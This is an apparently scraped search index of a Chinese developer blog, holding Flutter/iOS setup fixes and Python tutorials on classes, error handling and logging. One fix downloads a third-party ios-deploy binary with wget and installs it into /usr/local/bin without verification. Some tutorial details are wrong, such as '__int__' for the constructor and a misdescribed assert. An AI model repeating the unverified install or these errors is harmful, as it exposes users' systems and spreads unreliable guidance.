[{"title":"","url":"http://zhoushaw.github.io/2019/10/16/learning/flutter/flutter遇到的问题/","content":"<h2 id=\"基本环境问题\"><a href=\"#基本环境问题\" class=\"headerlink\" title=\"基本环境问题\"></a>基本环境问题</h2><blockquote>\n<p><code>CocoaPods installed but not initialised</code>问题</p>\n</blockquote>\n<p><a href=\"https://github.com/flutter/flutter/issues/41291\" target=\"_blank\" rel=\"noopener\">flutter CocaPods not initialised</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo gem uninstall cocoapods</span><br><span class=\"line\">sudo gem install cocoapods -v 1.7.5</span><br><span class=\"line\">pod setup</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://blog.iw3c.com/archive/1147\" target=\"_blank\" rel=\"noopener\">真机调试用flutter开发ios应用时出现的问题的总结</a></p>\n<p>app创建名称必须和<code>Bundle Identifier</code>一致</p>\n<blockquote>\n<p>Device doesn’t support wireless sync. AMDeviceStartSe</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd ~/Desktop</span><br><span class=\"line\">wget https://raw.githubusercontent.com/kangwang1988/kangwang1988.github.io/master/others/ios-deploy</span><br><span class=\"line\">chmod +x ios-deploy</span><br><span class=\"line\">mv ios-deploy /usr/local/bin</span><br></pre></td></tr></table></figure>\n","categories":[],"tags":[]},{"title":"python面向对象编程","url":"http://zhoushaw.github.io/2019/09/18/learning/python/python面向对象编程/","content":"<h1 id=\"面向对象编程\"><a href=\"#面向对象编程\" class=\"headerlink\" title=\"面向对象编程\"></a>面向对象编程</h1><h2 id=\"类和实例\"><a href=\"#类和实例\" class=\"headerlink\" title=\"类和实例\"></a>类和实例</h2><blockquote>\n<p>定义类</p>\n</blockquote>\n<p>以Student类为例，在Python中，定义类是通过<code>class</code>关键字：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Student(object):</span><br><span class=\"line\">    pass</span><br></pre></td></tr></table></figure>\n<p>class后面紧接着是类名，即Student，类名通常是大写开头的单词，紧接着是(object)，表示该类是从哪个类继承下来的，继承的概念我们后面再讲，通常，如果没有合适的继承类，就使用object类，这是所有类最终都会继承的类(object可省略)</p>\n<p>根据类创造实例</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bart = Student()</span><br><span class=\"line\">bart</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>类初始化</p>\n</blockquote>\n<p>在Python中构造函数是<code>__int__</code>，第一个参数是<code>self</code>自身，后续的参数根据调用类时创建</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Student(object):</span><br><span class=\"line\"></span><br><span class=\"line\">    def __init__(self, name, score):</span><br><span class=\"line\">        self.name = name</span><br><span class=\"line\">        self.score = score</span><br></pre></td></tr></table></figure>\n<p>实例的变量名如果以__开头，就变成了一个私有变量（private），只有内部可以访问，外部不能访问:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Student(object):</span><br><span class=\"line\"></span><br><span class=\"line\">    def __init__(self, name, score):</span><br><span class=\"line\">        self.__name = name</span><br><span class=\"line\">        self.__score = score</span><br><span class=\"line\"></span><br><span class=\"line\">    def print_score(self):</span><br><span class=\"line\">        print(&apos;%s: %s&apos; % (self.__name, self.__score))</span><br></pre></td></tr></table></figure>\n<p><strong>在Python中，变量名类似<strong>xxx</strong>的，也就是以双下划线开头，并且以双下划线结尾的，是特殊变量，特殊变量是可以直接访问的，不是private变量，所以，不能用<strong>name</strong>、<strong>score</strong>这样的变量名</strong></p>\n<h2 id=\"继承和多态\"><a href=\"#继承和多态\" class=\"headerlink\" title=\"继承和多态\"></a>继承和多态</h2><blockquote>\n<p>继承</p>\n</blockquote>\n<p>基类：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Animal(object):</span><br><span class=\"line\">    def run(self):</span><br><span class=\"line\">        print(&apos;Animal is running...&apos;)</span><br></pre></td></tr></table></figure>\n<p>当我们需要编写Dog和Cat类时，就可以直接从Animal类继承：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Dog(Animal):</span><br><span class=\"line\">    pass</span><br><span class=\"line\">dog = Dog()</span><br><span class=\"line\">dog.run()</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>多态</p>\n</blockquote>\n<p>可以在子类上覆盖父类的方法</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Dog(Animal):</span><br><span class=\"line\">    def run(self):</span><br><span class=\"line\">        print(&apos;Dog is running...&apos;)</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>判断变量类型</p>\n</blockquote>\n<p>判断一个变量是否是某个类型可以用isinstance()判断：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">isinstance(a, list)</span><br><span class=\"line\">True</span><br><span class=\"line\">isinstance(b, Animal)</span><br><span class=\"line\">True</span><br><span class=\"line\">isinstance(c, Dog)</span><br><span class=\"line\">True</span><br></pre></td></tr></table></figure>\n<p>但是通过<code>isinstance</code>，检测出来的结果不仅仅包含父类还包含超类(父类的基类)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">c = Dog()</span><br><span class=\"line\">isinstance(c, Animal)</span><br><span class=\"line\">True</span><br></pre></td></tr></table></figure>\n<h2 id=\"获取对象信息\"><a href=\"#获取对象信息\" class=\"headerlink\" title=\"获取对象信息\"></a>获取对象信息</h2><blockquote>\n<p>type()</p>\n</blockquote>\n<p>我们来判断对象类型，使用type()函数：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">type(123)</span><br><span class=\"line\">#&lt;class &apos;int&apos;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">type(&apos;str&apos;)</span><br><span class=\"line\">#&lt;class &apos;str&apos;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">type(None)</span><br><span class=\"line\">#&lt;type(None) &apos;NoneType&apos;&gt;</span><br></pre></td></tr></table></figure>\n<p>判断对象类型</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">type(123)==int</span><br><span class=\"line\">True</span><br><span class=\"line\">type(&apos;abc&apos;)==str</span><br><span class=\"line\">True</span><br><span class=\"line\"></span><br><span class=\"line\">import types</span><br><span class=\"line\">def fn():</span><br><span class=\"line\">    pass</span><br><span class=\"line\"></span><br><span class=\"line\">type(fn)==types.FunctionType</span><br><span class=\"line\">True</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>dir()</p>\n</blockquote>\n<p><code>dir()</code>函数会返回对象上所有的属性和方法</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dir(&apos;ABC&apos;)</span><br><span class=\"line\">[&apos;__add__&apos;, &apos;__class__&apos;,..., &apos;__subclasshook__&apos;, &apos;capitalize&apos;, &apos;casefold&apos;,..., &apos;zfill&apos;]</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>getattr()、setattr()以及hasattr()，我们可以直接操作一个对象的状态</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hasattr(obj, &apos;x&apos;) # 有属性&apos;x&apos;吗？</span><br><span class=\"line\">setattr(obj, &apos;y&apos;, 19) # 设置一个属性&apos;y&apos;</span><br><span class=\"line\">getattr(obj, &apos;y&apos;) # 获取属性&apos;y&apos;</span><br></pre></td></tr></table></figure>\n<h2 id=\"类属性\"><a href=\"#类属性\" class=\"headerlink\" title=\"类属性\"></a>类属性</h2><p>可通过简单的声明生成类属性，当实例属性与类属性名称相同时，将会获取实例属性的值</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Student(object):</span><br><span class=\"line\">    name = &apos;Student&apos;</span><br><span class=\"line\">    </span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        pass</span><br><span class=\"line\">        self.name = &apos;shaw&apos;</span><br><span class=\"line\">        </span><br><span class=\"line\">d = Student()</span><br><span class=\"line\">print(d.name) # shaw</span><br></pre></td></tr></table></figure>\n<p>只有当实例中不存在属性时返回类属性</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Student(object):</span><br><span class=\"line\">    name = &apos;Student&apos;</span><br><span class=\"line\">d = Student()</span><br><span class=\"line\">print(d.name) # Student</span><br></pre></td></tr></table></figure>\n<h3 id=\"slots\"><a href=\"#slots\" class=\"headerlink\" title=\"__slots__\"></a><code>__slots__</code></h3><blockquote>\n<p>限制类添加属性范围</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Student():</span><br><span class=\"line\">    __slots__ = (&apos;age&apos;)</span><br><span class=\"line\">stud1 = Student()</span><br><span class=\"line\">stud1.name = &apos;shaw&apos;</span><br></pre></td></tr></table></figure>\n<p>限制了<code>Student</code>类只能添加<code>age</code>属性，若添加其他属性将会报错，上述例子运行时将会报错</p>\n<p><strong>使用<strong>slots</strong>要注意，<strong>slots</strong>定义的属性仅对当前类实例起作用，对继承的子类是不起作用的。除非子类添加与父类一样的<strong>slots</strong></strong></p>\n<p>###@property</p>\n<p>拦截类属性的<code>setter</code>和<code>getter</code>操作</p>\n<p>定义一个学生类，对学生类的<code>score</code>属性的读写进行校验：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Student(object):</span><br><span class=\"line\"></span><br><span class=\"line\">    @property</span><br><span class=\"line\">    def score(self):</span><br><span class=\"line\">        return self._score</span><br><span class=\"line\"></span><br><span class=\"line\">    @score.setter</span><br><span class=\"line\">    def score(self, value):</span><br><span class=\"line\">        if not isinstance(value, int):</span><br><span class=\"line\">            raise ValueError(&apos;score must be an integer!&apos;)</span><br><span class=\"line\">        if value &lt; 0 or value &gt; 100:</span><br><span class=\"line\">            raise ValueError(&apos;score must between 0 ~ 100!&apos;)</span><br><span class=\"line\">        self._score = value</span><br></pre></td></tr></table></figure>\n<p>若只定义<code>getter</code>不定义<code>setter</code>时，<br>该类只有读操作，无法进行写入</p>\n<h2 id=\"多重继承\"><a href=\"#多重继承\" class=\"headerlink\" title=\"多重继承\"></a>多重继承</h2><p>Python可以同时继承多个类</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Mammal()</span><br><span class=\"line\">    pass</span><br><span class=\"line\">class RunnableMixIn()</span><br><span class=\"line\">    pass</span><br><span class=\"line\">class Dog(Mammal, RunnableMixIn):</span><br><span class=\"line\">    pass</span><br></pre></td></tr></table></figure>\n<h2 id=\"定制类\"><a href=\"#定制类\" class=\"headerlink\" title=\"定制类\"></a>定制类</h2><p>可以通过给类添加一些特殊属性来完善类的功能</p>\n<h3 id=\"str\"><a href=\"#str\" class=\"headerlink\" title=\"__str__\"></a><code>__str__</code></h3><p>我们队类进行<code>print</code>打印时，打印出来的并不能让你了解类的属性和方法的细节，我们可以通过<code>__str__</code>方法来处理打印后的展示的情况，例如下面<code>Student</code>打印实例</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Student(object):</span><br><span class=\"line\">    def __init__(self, name):</span><br><span class=\"line\">        self.name = name</span><br><span class=\"line\"></span><br><span class=\"line\">print(Student(&apos;Michael&apos;))</span><br><span class=\"line\">#&lt;__main__.Student object at 0x109afb190&gt;</span><br></pre></td></tr></table></figure>\n<p>从上面的例子可以看到，无法通过过打印类来了解类具体的细节。我们可以通过<code>__str__</code>来定义类<code>str</code>化时，展示的内容</p>\n<blockquote>\n<p>定义str化后的内容</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Student(object):</span><br><span class=\"line\">    def __init__(self, name):</span><br><span class=\"line\">        self.name = name</span><br><span class=\"line\">    def __str__(self):</span><br><span class=\"line\">        return &apos;Student object (name: %s)&apos; % self.name</span><br><span class=\"line\">    __repr__ = __str__</span><br><span class=\"line\"></span><br><span class=\"line\">print(Student(&apos;Michael&apos;))</span><br><span class=\"line\">#Student object (name: Michael)</span><br></pre></td></tr></table></figure>\n<h3 id=\"iter\"><a href=\"#iter\" class=\"headerlink\" title=\"__iter__\"></a><code>__iter__</code></h3><p>如果类需要被迭代可以通过<code>__iter__</code>和<code>__next__()</code>，iter是用来返回迭代对象，next是用来计算下一个迭代值的</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Fib(object):</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        self.a, self.b = 0, 1 # 初始化两个计数器a，b</span><br><span class=\"line\"></span><br><span class=\"line\">    def __iter__(self):</span><br><span class=\"line\">        return self # 实例本身就是迭代对象，故返回自己</span><br><span class=\"line\"></span><br><span class=\"line\">    def __next__(self):</span><br><span class=\"line\">        self.a, self.b = self.b, self.a + self.b # 计算下一个值</span><br><span class=\"line\">        if self.a &gt; 100000: # 退出循环的条件</span><br><span class=\"line\">            raise StopIteration()</span><br><span class=\"line\">        return self.a # 返回下一个值</span><br></pre></td></tr></table></figure>\n<h3 id=\"getitem\"><a href=\"#getitem\" class=\"headerlink\" title=\"__getitem__\"></a><code>__getitem__</code></h3><p>定义使用下标访问类时，定义返回的值</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Fib(object):</span><br><span class=\"line\">    def __getitem__(self, n):</span><br><span class=\"line\">        a, b = 1, 1</span><br><span class=\"line\">        for x in range(n):</span><br><span class=\"line\">            a, b = b, a + b</span><br><span class=\"line\">        return a</span><br><span class=\"line\"># f = Fib()</span><br><span class=\"line\"># f[0]</span><br><span class=\"line\">#1</span><br></pre></td></tr></table></figure>\n<h3 id=\"getattr\"><a href=\"#getattr\" class=\"headerlink\" title=\"__getattr__\"></a><code>__getattr__</code></h3><p>当访问不存在属性、或者方法时可以通过在<code>__getattr__</code>中定义返回内容</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Student(object):</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        self.name = &apos;Michael&apos;</span><br><span class=\"line\">    def __getattr__(self, attr):</span><br><span class=\"line\">        if attr==&apos;age&apos;:</span><br><span class=\"line\">            return 22</span><br><span class=\"line\"># st = Student()</span><br><span class=\"line\"># st.age </span><br><span class=\"line\"># 22</span><br></pre></td></tr></table></figure>\n<p>可以用在动态接口的情况下，做一些异常处理</p>\n<h3 id=\"call\"><a href=\"#call\" class=\"headerlink\" title=\"__call__\"></a><code>__call__</code></h3><p>定义实例被调用时执行的内容</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Student(object):</span><br><span class=\"line\">    def __init__(self, name):</span><br><span class=\"line\">        self.name = name</span><br><span class=\"line\"></span><br><span class=\"line\">    def __call__(self):</span><br><span class=\"line\">        print(&apos;My name is %s.&apos; % self.name)</span><br><span class=\"line\"></span><br><span class=\"line\">s = Student(&apos;Michael&apos;)</span><br><span class=\"line\">s() # self参数不要传入</span><br><span class=\"line\"># My name is Michael.</span><br></pre></td></tr></table></figure>\n<p>通过<code>callable()</code>函数，我们就可以判断一个对象是否是“可调用”对象。</p>\n<h2 id=\"枚举类\"><a href=\"#枚举类\" class=\"headerlink\" title=\"枚举类\"></a>枚举类</h2><p>在Python中可以将类做成枚举类，可以更形象的使用枚举</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from enum import Enum, unique</span><br><span class=\"line\"></span><br><span class=\"line\">@unique # 用于检测是否有重复</span><br><span class=\"line\">class Weekday(Enum): # 继承枚举类</span><br><span class=\"line\">    Sun = 0 # Sun的value被设定为0</span><br><span class=\"line\">    Mon = 1</span><br><span class=\"line\">    Tue = 2</span><br><span class=\"line\">    Wed = 3</span><br><span class=\"line\">    Thu = 4</span><br><span class=\"line\">    Fri = 5</span><br><span class=\"line\">    Sat = 6</span><br><span class=\"line\"></span><br><span class=\"line\"># day1 = Weekday.Mon</span><br></pre></td></tr></table></figure>\n","categories":["python"],"tags":["python"]},{"title":"python错误、调试和测试","url":"http://zhoushaw.github.io/2019/09/18/learning/python/python调试/","content":"<h2 id=\"错误处理\"><a href=\"#错误处理\" class=\"headerlink\" title=\"错误处理\"></a>错误处理</h2><p>Python通过<code>try...except...finally...</code>的错误处理机制</p>\n<p><a href=\"https://www.runoob.com/python/python-exceptions.html\" target=\"_blank\" rel=\"noopener\">错误原因表</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">try:</span><br><span class=\"line\">    正常的操作</span><br><span class=\"line\">   ......................</span><br><span class=\"line\">except:</span><br><span class=\"line\">    发生异常，执行这块代码</span><br><span class=\"line\">   ......................</span><br><span class=\"line\">else:</span><br><span class=\"line\">    如果没有异常执行这块代码</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>检测所有异常</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import traceback</span><br><span class=\"line\"></span><br><span class=\"line\">try:</span><br><span class=\"line\">　　1/0</span><br><span class=\"line\">except Exception as e:</span><br><span class=\"line\">　　print(e) # 错误原因</span><br><span class=\"line\">　　traceback.print_exc() # 错误的具体行数</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>捕获指定错误</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">try:</span><br><span class=\"line\">    正常的操作</span><br><span class=\"line\">   ......................</span><br><span class=\"line\">except(Exception1[, Exception2[,...ExceptionN]]]):</span><br><span class=\"line\">   发生以上多个异常中的一个，执行这块代码</span><br><span class=\"line\">   ......................</span><br><span class=\"line\">else:</span><br><span class=\"line\">    如果没有异常执行这块代码</span><br></pre></td></tr></table></figure>\n<p>例如捕获用户退出操作：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">try:</span><br><span class=\"line\">    s=input()</span><br><span class=\"line\">except (KeyboardInterrupt):</span><br><span class=\"line\">    print(&apos;用户中断输入&apos;)</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>不捕获原因</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">try:</span><br><span class=\"line\">    n=10/0</span><br><span class=\"line\">except:</span><br><span class=\"line\">    # print(e)</span><br><span class=\"line\">    traceback.print_exc()</span><br></pre></td></tr></table></figure>\n<h2 id=\"调试\"><a href=\"#调试\" class=\"headerlink\" title=\"调试\"></a>调试</h2><blockquote>\n<p>print</p>\n</blockquote>\n<p>通过打印内容来进行调试</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(&apos;&gt;&gt;&gt; n = %d&apos; % n)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>缺点<ul>\n<li>运行时含有大量垃圾信息</li>\n<li>还得删除</li>\n</ul>\n</li>\n</ul>\n<blockquote>\n<p>断言</p>\n</blockquote>\n<p>格式：<code>assert expression [, arguments]</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assert n != 0, &apos;n is zero!&apos;</span><br></pre></td></tr></table></figure>\n<p>断言<code>n</code>是0，如果是会报错</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">n = 0 </span><br><span class=\"line\">assert n != 0, &apos;n is zero!&apos;</span><br><span class=\"line\">#AssertionError: n is zero!</span><br></pre></td></tr></table></figure>\n<p>运行时携带<code>-O</code>不报错</p>\n<blockquote>\n<p>logging</p>\n</blockquote>\n<p><code>logging</code>输入日志形式，可以输出到文件</p>\n<hr>\n<p>对应的log类型和权重</p>\n<ul>\n<li>NOTSET（0）</li>\n<li>DEBUG（10）</li>\n<li>INFO（20）</li>\n<li>WARNING（30）</li>\n<li>ERROR（40）</li>\n</ul>\n<p>使用：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import logging</span><br><span class=\"line\"></span><br><span class=\"line\">logging.basicConfig(filename=&quot;test.log&quot;, filemode=&quot;w&quot;, format=&quot;%(asctime)s %(name)s:%(levelname)s:%(message)s&quot;, datefmt=&quot;%d-%M-%Y %H:%M:%S&quot;, level=logging.DEBUG)</span><br><span class=\"line\"></span><br><span class=\"line\">logging.debug(&apos;This is a debug message&apos;)</span><br><span class=\"line\">logging.info(&apos;This is an info message&apos;)</span><br><span class=\"line\">logging.warning(&apos;This is a warning message&apos;)</span><br><span class=\"line\">logging.error(&apos;This is an error message&apos;)</span><br><span class=\"line\">logging.critical(&apos;This is a critical message&apos;)</span><br></pre></td></tr></table></figure>\n<p>basicConfig函数接收参数：</p>\n<ul>\n<li>filename: 日志保存的文件名</li>\n<li>filemode：文件模式</li>\n<li>format: 日志格式<ul>\n<li><a href=\"https://docs.python.org/3.7/library/logging.html#logrecord-attributes\" target=\"_blank\" rel=\"noopener\">formatter参数格式</a></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"单元测试\"><a href=\"#单元测试\" class=\"headerlink\" title=\"单元测试\"></a>单元测试</h2><p>在Python中我们可以通过<code>unittest</code>模块来编写单元测试，我们将自身的类继承了<code>unittest.TestCase</code>后，将会自动运行类中带有<code>test_</code>开头的函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import unittest</span><br><span class=\"line\">class 